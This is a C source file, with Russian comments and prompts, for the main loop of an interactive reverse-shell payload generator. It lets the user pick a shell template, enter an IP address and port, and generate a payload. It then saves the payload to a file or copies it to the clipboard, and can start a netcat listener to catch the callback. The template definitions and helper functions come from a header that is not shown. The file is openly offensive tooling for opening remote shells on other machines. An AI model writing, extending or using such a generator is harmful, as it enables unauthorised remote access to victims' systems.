#include "reverse_shell.h"
#include <stdio.h>
#include <string.h>

#define BUFFER_SIZE 1024

int main() {
    ShellTemplate templates[MAX_SHELL_TYPES];
    int template_count = 0;
    char ip[16];  // Для IPv4 адреса
    int port;
    char payload[BUFFER_SIZE];
    char filename[100];
    
    initialize_templates(templates, &template_count);
    
    while (1) {
        show_menu(templates, template_count);
        int choice = get_user_choice(template_count);
        
        if (choice == 0) {
            printf("Выход из программы.\n");
            break;
        }
        
        // Запрашиваем данные для подключения
        printf("\n=== Генерация %s ===\n", templates[choice - 1].name);
        printf("Введите IP адрес: ");
        scanf("%15s", ip);
        
        printf("Введите порт: ");
        scanf("%d", &port);
        
        // Генерируем payload
        generate_shell(&templates[choice - 1], ip, port, payload);
        
        // Показываем результат
        printf("\n=== Сгенерированный payload ===\n");
        printf("%s\n\n", payload);

        printf("Выберите действие:\n");
        printf("1. Сохранить в файл\n");
        printf("2. Скопировать в буфер обмена\n");
        printf("3. Показать только на экране\n");
        printf("Ваш выбор: ");

        int export_choice;
        scanf("%d", &export_choice);

        switch (export_choice) {
            case 1: {
                char filename[100];
                printf("Введите имя файла: ");
                scanf("%99s", filename);
                save_to_file(filename, payload);
                break;
            }
            case 2:
                copy_to_clipboard(payload);
                break;
            case 3:
                printf("Payload оставлен на экране\n");
                break;
            default:
                printf("Неверный выбор\n");
        }

        printf("\nЗапустить netcat listener на порту %d? (y/n): ", port);
        char listener_choice;
        scanf(" %c", &listener_choice);

        if (listener_choice == 'y' || listener_choice == 'Y') {
            printf("Запускаем listener...\n");
            start_listener(port);
        }

       break;
    }
    
    return 0;
}